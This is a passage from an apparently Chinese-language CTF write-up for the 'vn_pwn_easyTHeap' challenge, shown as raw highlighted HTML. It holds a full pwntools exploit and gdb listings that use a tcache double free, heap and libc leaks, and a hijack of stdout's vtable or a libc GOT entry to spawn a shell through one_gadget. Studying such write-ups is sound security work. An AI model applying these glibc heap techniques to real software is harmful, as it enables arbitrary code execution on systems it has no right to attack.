&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">4</span>))<br>	sla(<span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">md</span>(<span class="hljs-params">idx, data</span>):<br>	sla(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))<br>	sla(<span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-built_in">str</span>(idx))<br>	sla(<span class="hljs-string">&#x27;:&#x27;</span>, data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dp</span>(<span class="hljs-params">idx</span>):<br>	sla(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))<br>	sla(<span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">q</span>():<br>	sla(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">5</span>))	<br></code></pre></td></tr></table></figure>

<h4 id="leak-heap"><a href="#leak-heap" class="headerlink" title="leak heap"></a>leak heap</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">ad(<span class="hljs-number">0x100</span>) <span class="hljs-comment">#idx 0</span><br>ad(<span class="hljs-number">0x100</span>) <span class="hljs-comment">#idx 1</span><br><br>rm(<span class="hljs-number">0</span>) <span class="hljs-comment"># double free使fd指向自己,下次开辟可以通过修改fd实现任意地址分配</span><br>rm(<span class="hljs-number">0</span>)<br><span class="hljs-comment"># leak heap addr</span><br>dp(<span class="hljs-number">0</span>) <span class="hljs-comment"># 打印自己本身地址</span><br>heap_base = u64(ru(<span class="hljs-string">&#x27;\n&#x27;</span>) + <span class="hljs-string">&#x27;\x00\x00&#x27;</span>) - <span class="hljs-number">0x260</span><br>li(<span class="hljs-string">&#x27;heap_base &#x27;</span> + <span class="hljs-built_in">hex</span>(heap_base))<br>   <br></code></pre></td></tr></table></figure>

<h4 id="leak-libc"><a href="#leak-libc" class="headerlink" title="leak libc"></a>leak libc</h4><p>通过使tcache bin的数量不满足满0~7之后,释放即获得通过unsoted bin通过打印泄漏libc地址, 那么怎样才能不满足呢,由于程序中最多只能分配7次,就不能使tcache bin的数量大于7了,那只能小于0,怎样才能小于0, 就采用tcache double free之后,就已经形成一个环,若没有修改fd,就一直在原地分配,分配成功后tcache bin的count - 1,当tcache bin的count小于0时,再次释放任何堆,就不会到tcache bin中了.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 一直开辟,直到count 小于0</span><br>   ad(<span class="hljs-number">0x100</span>) <span class="hljs-comment"># 2 for ajust</span><br>ad(<span class="hljs-number">0x100</span>) <span class="hljs-comment"># 3</span><br>   <span class="hljs-comment"># 这里count 为-1,若开辟后释放,就不会到tcache bin中了</span><br>ad(<span class="hljs-number">0x100</span>) <span class="hljs-comment"># 4</span><br>rm(<span class="hljs-number">0</span>)<br>   <span class="hljs-comment"># leak heap addr</span><br>dp(<span class="hljs-number">0</span>) <span class="hljs-comment"># 当前的fd就是自己本身的地址,泄漏出heap地址</span><br>heap_base = u64(ru(<span class="hljs-string">&#x27;\n&#x27;</span>) + <span class="hljs-string">&#x27;\x00\x00&#x27;</span>) - <span class="hljs-number">0x260</span><br>li(<span class="hljs-string">&#x27;heap_base &#x27;</span> + <span class="hljs-built_in">hex</span>(heap_base))<br></code></pre></td></tr></table></figure>

<h4 id="实现任意地址写入"><a href="#实现任意地址写入" class="headerlink" title="实现任意地址写入"></a>实现任意地址写入</h4><p>这里只需修改chunk 0的fd指向我们想要的地方,再次开辟,就会到我们想要修改的地方.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">p = p64(_IO_2_1_stdout_) <span class="hljs-comment">#修改chunk 0,(因为前几次分配都是重叠在一块chunk上的)的fd指向stdout</span><br>md(<span class="hljs-number">3</span>, p)<br><br>ad(<span class="hljs-number">0x100</span>) <span class="hljs-comment"># idx 5 for ajust</span><br>ad(<span class="hljs-number">0x100</span>) <span class="hljs-comment"># idx 6, 开辟到stdout</span><br></code></pre></td></tr></table></figure>

<p>上面任意地址写入已经实现,如果改写malloc_hook或者free_hook,可以改写成功,但是没有办法触发.这是因为，已经用完了add功能的7次调用,delete功能的3次调用,因此,接下来,就调用不了malloc或free,也就无法触发了.因此,可以劫持_IO_2_1_stdout_的虚表.通过IO流对虚表的调用来触发one_gadget.由于glibc为2.29,因此不能直接伪造虚表,而应该将虚表劫持为_IO_str_jumps_附近</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">0x00007f1fda7b1a65 &lt;+165&gt;:	lea    rdx,[rip+0x366cf4]        # 0x7f1fdab18760 	&lt;_IO_helper_jumps&gt;<br>0x00007f1fda7b1a6c &lt;+172&gt;:	lea    rax,[rip+0x367a55]        # 0x7f1fdab194c8<br>0x00007f1fda7b1a73 &lt;+179&gt;:	sub    rax,rdx<br>0x00007f1fda7b1a76 &lt;+182&gt;:	mov    rcx,r13<br>0x00007f1fda7b1a79 &lt;+185&gt;:	sub    rcx,rdx<br>0x00007f1fda7b1a7c &lt;+188&gt;:	cmp    rax,rcx<br>0x00007f1fda7b1a7f &lt;+191&gt;:	jbe    0x7f1fda7b1b40 &lt;_IO_puts+384&gt;<br>0x00007f1fda7b1a85 &lt;+197&gt;:	mov    rdx,rbx<br>0x00007f1fda7b1a88 &lt;+200&gt;:	mov    rsi,r12<br>0x00007f1fda7b1a8b &lt;+203&gt;:	call   QWORD PTR [r13+0x38] #调用虚表<br></code></pre></td></tr></table></figure>

<p>只需要让[r13+0x38]为IO_str_finish函数的指针即可,因此，需要将虚表修改为IO_str_jumps – XX,使得,r13+0x38正好对应上_IO_str_finish指针, 而IO_str_finish函数会call [<em>IO_2_1_stdout</em> + 0xE8]</p>
<p>call的前提是_IO_2_1_stdout_的flag的低1字节要为0. 综上,需要劫持_IO_2_1_stdout_结构体,修改flags,劫持虚表为IO_str_jumps – XX,修改_IO_2_1_stdout_+0xE8处为one_gadget.然后puts的调用即可触发one_gadget</p>
<h4 id="修改IO-2-1-stdout结构体"><a href="#修改IO-2-1-stdout结构体" class="headerlink" title="修改IO_2_1_stdout结构体"></a>修改IO_2_1_stdout结构体</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python">p = p64(<span class="hljs-number">0xfbad2886</span>) <span class="hljs-comment"># 要覆盖flag的最低bit为0</span><br>   <span class="hljs-comment">#中间数据保持不变</span><br>p += p64(_IO_2_1_stdout_ + <span class="hljs-number">0x200</span>) * <span class="hljs-number">7</span><br>p += p64(_IO_2_1_stdout_ + <span class="hljs-number">0x201</span>)<br>p += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">5</span><br>p += p32(<span class="hljs-number">1</span>) <span class="hljs-comment"># file num</span><br>p += p32(<span class="hljs-number">0</span>)<br>p += p64(<span class="hljs-number">0xffffffffffffffff</span>)<br>p += p64(<span class="hljs-number">0x000000000a000000</span>)<br>_IO_stdfile_1_lock = lib.address + (<span class="hljs-number">0x7ff3095508c0</span> - <span class="hljs-number">0x7ff309163000</span>)<br>p += p64(_IO_stdfile_1_lock)<br>p += p64(<span class="hljs-number">0xffffffffffffffff</span>)<br>p += p64(<span class="hljs-number">0</span>)<br>_IO_wide_data_1 = lib.address + (<span class="hljs-number">0x7f2fc336a8c0</span> - <span class="hljs-number">0x7f2fc2f7f000</span>)<br>p += p64(_IO_wide_data_1)<br>p += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span><br>p += p64(<span class="hljs-number">0xffffffff</span>)<br>p = p.ljust(<span class="hljs-number">0xd8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)<br>   <br>   <span class="hljs-comment">#修改对应IO_str_finish函数指针,该函数会调用IO_2_1_stdout_+0xE8处的函数指针</span><br>p += p64(vtable_jump)<br>p += p64(<span class="hljs-number">0</span>)<br>p += p64(one_gadget) <span class="hljs-comment"># IO_2_1_stdout_+0xE8处只需修改为one_gadget</span><br>md(<span class="hljs-number">6</span>, p)<br></code></pre></td></tr></table></figure>

<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp-1"></a>exp-1</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment">#-*- coding:utf-8 -*-</span><br><span class="hljs-comment"># Author: I0gan</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import LibcSearcher</span><br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-comment">#context.terminal = [&#x27;konsole&#x27;, &#x27;-x&#x27;, &#x27;bash&#x27;, &#x27;c&#x27;]</span><br><span class="hljs-comment">#context.terminal = &#x27;konsole&#x27;</span><br><span class="hljs-comment">#context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="hljs-comment">#context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br><br>exeFile = <span class="hljs-string">&#x27;vn_pwn_easyTHeap&#x27;</span><br>libFile = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br><br>remoteIp = <span class="hljs-string">&quot;node3.buuoj.cn&quot;</span><br>remotePort = <span class="hljs-number">28200</span><br><br><br>LOCAL = <span class="hljs-number">0</span><br>LIB   = <span class="hljs-number">1</span><br><br>r   =  <span class="hljs-keyword">lambda</span> x : io.recv(x)<br>ra  =  <span class="hljs-keyword">lambda</span>   : io.recvall()<br>rl  =  <span class="hljs-keyword">lambda</span>   : io.recvline(keepends = <span class="hljs-literal">True</span>)<br>ru  =  <span class="hljs-keyword">lambda</span> x : io.recvuntil(x, drop = <span class="hljs-literal">True</span>)<br>s   =  <span class="hljs-keyword">lambda</span> x : io.send(x)<br>sl  =  <span class="hljs-keyword">lambda</span> x : io.sendline(x)<br>sa  =  <span class="hljs-keyword">lambda</span> x, y : io.sendafter(x, y)<br>sla =  <span class="hljs-keyword">lambda</span> x, y : io.sendlineafter(x, y)<br>ia  =  <span class="hljs-keyword">lambda</span> : io.interactive()<br>c   =  <span class="hljs-keyword">lambda</span> : io.close()<br>li    = <span class="hljs-keyword">lambda</span> x : log.info(x)<br>db    = <span class="hljs-keyword">lambda</span>   : gdb.attach(io)<br><br><span class="hljs-comment">#--------------------------Func-----------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_IO_str_jumps_offset</span>():<br>	IO_file_jumps_offset = lib.sym[<span class="hljs-string">&#x27;_IO_file_jumps&#x27;</span>]<br>	IO_str_underflow_offset = lib.sym[<span class="hljs-string">&#x27;_IO_str_underflow&#x27;</span>]<br>	<span class="hljs-keyword">for</span> ref_offset <span class="hljs-keyword">in</span> lib.search(p64(IO_str_underflow_offset)):<br>		li(<span class="hljs-string">&#x27;AA&#x27;</span>)<br>		possible_IO_str_jumps_offset = ref_offset - <span class="hljs-number">0x20</span><br>		<span class="hljs-keyword">if</span> possible_IO_str_jumps_offset &gt; IO_file_jumps_offset:<br>			<span class="hljs-keyword">return</span> possible_IO_str_jumps_offset<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ad</span>(<span class="hljs-params">size</span>):<br>	sla(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>	sla(<span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rm</span>(<span class="hljs-params">idx</span>):<br>	sla(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">4</span>))<br>	sla(<span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">md</span>(<span class="hljs-params">idx, data</span>):<br>	sla(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))<br>	sla(<span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-built_in">str</span>(idx))<br>	sla(<span class="hljs-string">&#x27;:&#x27;</span>, data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dp</span>(<span class="hljs-params">idx</span>):<br>	sla(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))<br>	sla(<span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">q</span>():<br>	sla(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">5</span>))	<br><br><span class="hljs-comment">#--------------------------Exploit--------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>():<br>	ad(<span class="hljs-number">0x100</span>) <span class="hljs-comment">#idx 0</span><br>	ad(<span class="hljs-number">0x100</span>) <span class="hljs-comment">#idx 1</span><br><br>	rm(<span class="hljs-number">0</span>)<br>	rm(<span class="hljs-number">0</span>)<br><br>	<span class="hljs-comment"># leak heap addr</span><br>	dp(<span class="hljs-number">0</span>)<br>	heap_base = u64(ru(<span class="hljs-string">&#x27;\n&#x27;</span>) + <span class="hljs-string">&#x27;\x00\x00&#x27;</span>) - <span class="hljs-number">0x260</span><br>	li(<span class="hljs-string">&#x27;heap_base &#x27;</span> + <span class="hljs-built_in">hex</span>(heap_base))<br><br>	ad(<span class="hljs-number">0x100</span>) <span class="hljs-comment"># 2 for ajust</span><br>	ad(<span class="hljs-number">0x100</span>) <span class="hljs-comment"># 3</span><br>	ad(<span class="hljs-number">0x100</span>) <span class="hljs-comment"># 4 teache count as -1, so free chunk will not be teache bin</span><br>	rm(<span class="hljs-number">0</span>)<br><br>	<span class="hljs-comment"># leak libc</span><br>	_IO_str_jumps_offset = get_IO_str_jumps_offset()<br><br>	dp(<span class="hljs-number">0</span>)<br>	lib.address = u64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">5</span>:] + <span class="hljs-string">&#x27;\x7f\x00\x00&#x27;</span>) - <span class="hljs-number">96</span> - <span class="hljs-number">0x3ebc40</span><br>	li(<span class="hljs-string">&#x27;libc base &#x27;</span> + <span class="hljs-built_in">hex</span>(lib.address))<br><br>	_IO_str_jumps = lib.address + _IO_str_jumps_offset<br>	_IO_2_1_stdout_ = lib.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>]<br><br>	li(<span class="hljs-string">&#x27;_IO_str_jumps &#x27;</span> + <span class="hljs-built_in">hex</span>(_IO_str_jumps))<br>	li(<span class="hljs-string">&#x27;_IO_2_1_stdout &#x27;</span> + <span class="hljs-built_in">hex</span>(_IO_2_1_stdout_))<br>	vtable_jump = _IO_str_jumps - <span class="hljs-number">0x28</span><br>	gadget = [<span class="hljs-number">0x4f2c5</span>, <span class="hljs-number">0x4f322</span>, <span class="hljs-number">0x10a38c</span>]<br>	one_gadget = lib.address + gadget[<span class="hljs-number">1</span>]<br><br>	<span class="hljs-comment"># can&#x27;t malloc only to modify _IO_2_1_stdout vtable</span><br>	p = p64(_IO_2_1_stdout_) <span class="hljs-comment"># evil address</span><br>	md(<span class="hljs-number">3</span>, p)<br><br>	ad(<span class="hljs-number">0x100</span>) <span class="hljs-comment"># idx 5 for ajust</span><br>	ad(<span class="hljs-number">0x100</span>) <span class="hljs-comment"># idx 6, malloc to our addr</span><br><br>	p = p64(<span class="hljs-number">0xfbad2886</span>)<br>	p += p64(_IO_2_1_stdout_ + <span class="hljs-number">0x200</span>) * <span class="hljs-number">7</span><br>	p += p64(_IO_2_1_stdout_ + <span class="hljs-number">0x201</span>)<br>	p += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">5</span><br>	p += p32(<span class="hljs-number">1</span>) <span class="hljs-comment"># file num</span><br>	p += p32(<span class="hljs-number">0</span>)<br>	p += p64(<span class="hljs-number">0xffffffffffffffff</span>)<br>	p += p64(<span class="hljs-number">0x000000000a000000</span>)<br>	_IO_stdfile_1_lock = lib.address + (<span class="hljs-number">0x7ff3095508c0</span> - <span class="hljs-number">0x7ff309163000</span>)<br>	p += p64(_IO_stdfile_1_lock)<br>	p += p64(<span class="hljs-number">0xffffffffffffffff</span>)<br>	p += p64(<span class="hljs-number">0</span>)<br>	_IO_wide_data_1 = lib.address + (<span class="hljs-number">0x7f2fc336a8c0</span> - <span class="hljs-number">0x7f2fc2f7f000</span>)<br>	p += p64(_IO_wide_data_1)<br>	p += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span><br>	p += p64(<span class="hljs-number">0xffffffff</span>)<br>	p = p.ljust(<span class="hljs-number">0xd8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)<br>	p += p64(vtable_jump)<br>	p += p64(<span class="hljs-number">0</span>)<br>	p += p64(one_gadget)<br><br>	md(<span class="hljs-number">6</span>, p)<br>	<span class="hljs-comment">#db()</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">finish</span>():<br>	ia()<br>	c()<br><br><span class="hljs-comment">#--------------------------Main-----------------------------</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>	<br>	<span class="hljs-keyword">if</span> LOCAL:<br>		exe = ELF(exeFile)<br>		<span class="hljs-keyword">if</span> LIB:<br>			lib = ELF(libFile)<br>			io = exe.process(env = &#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libFile&#125;)<br>		<span class="hljs-keyword">else</span>:<br>			io = exe.process()<br>	<br>	<span class="hljs-keyword">else</span>:<br>		exe = ELF(exeFile)<br>		io = remote(remoteIp, remotePort)<br>		<span class="hljs-keyword">if</span> LIB:<br>			lib = ELF(libFile)<br>	<br>	exploit()<br>	finish()<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x4f2c5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rsp &amp; 0xf == 0</span><br><span class="hljs-string">  rcx == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4f322 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x40] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x10a38c execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>

<p>参考: <a target="_blank" rel="noopener" href="https://blog.csdn.net/seaaseesa/article/details/105404106">https://blog.csdn.net/seaaseesa/article/details/105404106</a></p>
<h2 id="打法2"><a href="#打法2" class="headerlink" title="打法2"></a>打法2</h2><p>评估: </p>
<p>复杂度: 一般  成功率: 一般</p>
<p>上面那个调用太复杂了,来个直接的</p>
<h3 id="知识点-6"><a href="#知识点-6" class="headerlink" title="知识点"></a>知识点</h3><p>tcache, libc中的链接原理(与plt与got差不多)</p>
<h3 id="思路-8"><a href="#思路-8" class="headerlink" title="思路"></a>思路</h3><p>程序中限制了<code>malloc</code>和<code>free</code>的次数, 存在明显的uaf漏洞, 但是可以首先利用Tcache dup泄露heap 地址, 然后通过使tcache bin的数量不满足满0~7之后,释放即获得通过unsoted bin通过打印泄漏libc地址,后面通过还有任意地址分配.将要调用的某个libc中的某个plt函数所对应的跳转地址中的值给改为one_gadget</p>
<h3 id="利用-8"><a href="#利用-8" class="headerlink" title="利用"></a>利用</h3><p>这个获取libc地址的打法与上面一样,就不写了, 主要是获得任意读写地址之后,怎样打one_gadget调用.这个打发就简单得多了,且高效,若所以one_gadget打不通,还可以换其他libc中plt函数来打,打通几率大大提升.</p>
<p>通过调试, 发现在puts中存在一个plt,但是我打了全部one_gadget,就是参数不符合one_gadget,所以在printf中找到一个,如下.ABS*+0xa07f0@plt就是我们的目标了.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">  0x7f68f522141f &lt;vfprintf+143&gt;    mov    qword ptr [rbp - 0x438], rax<br>  0x7f68f5221426 &lt;vfprintf+150&gt;    movups xmmword ptr [rbp - 0x448], xmm0<br>► 0x7f68f522142d &lt;vfprintf+157&gt;    call   *ABS*+0xa07f0@plt &lt;0x7f68f51e7040&gt;<br>       rdi: 0x55d549dc2ff6 ◂— imul   esp, dword ptr [rax + rdi*2 + 0x3f], 0x6e6f6300 /* &#x27;idx?&#x27; */<br>       rsi: 0x25<br>       rdx: 0x7ffe06e5d790 ◂— 0x3000000008<br>       rcx: 0x0<br><br></code></pre></td></tr></table></figure>

<p>反编译<em>ABS</em>+0xa07f0@plt &lt;0x7f68f51e7040&gt;,获取类似与储存地址的got表地址.0x7f68f55b1048</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">pwndbg&gt; disass 0x7f68f51e7040<br>Dump of assembler code for function *ABS*+0xa07f0@plt:<br>   0x00007f68f51e7040 &lt;+0&gt;:	jmp    QWORD PTR [rip+0x3ca002]        # 0x7f68f55b1048<br>   0x00007f68f51e7046 &lt;+6&gt;:	push   0x28<br>   0x00007f68f51e704b &lt;+11&gt;:	jmp    0x7f68f51e6fd0<br>End of assembler dump.<br>pwndbg&gt; x /40gx 0x7f68f55b1048 # 修改里面的地址为one_gadget就行.<br>0x7f68f55b1048:	0x00007f68f5277120	0x00007f68f5345c80<br>0x7f68f55b1058:	0x00007f68f51e7066	0x00007f68f5347490<br>0x7f68f55b1088:	0x00007f68f5271970	0x00007f68f5350f90<br>0x7f68f55b1098:	0x00007f68f5271ea0	0x00007f68f55d0250<br>...  ...<br>pwndbg&gt; x /10gx 0x00007f68f5277120<br>0x7f68f5277120 &lt;__strchrnul_sse2&gt;:	0xff25f889ce6e0f66	0x3dc9600f6600000f<br>0x7f68f5277130 &lt;__strchrnul_sse2+16&gt;:	0xc9610f6600000fc0	0x4d8f0f00c9700f66<br>0x7f68f5277140 &lt;__strchrnul_sse2+32&gt;:	0x66076f0ff3000001	0x66e06f0f66dbef0f<br>0x7f68f5277150 &lt;__strchrnul_sse2+48&gt;:	0x66e3740f66c1740f	0x85c0d70f66c4eb0f<br>0x7f68f5277160 &lt;__strchrnul_sse2+64&gt;:	0x8d48c0bc0f0d74c0	0x0000441f0fc30704<br>pwndbg&gt;<br><br><br></code></pre></td></tr></table></figure>

<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp-2"></a>exp-2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span 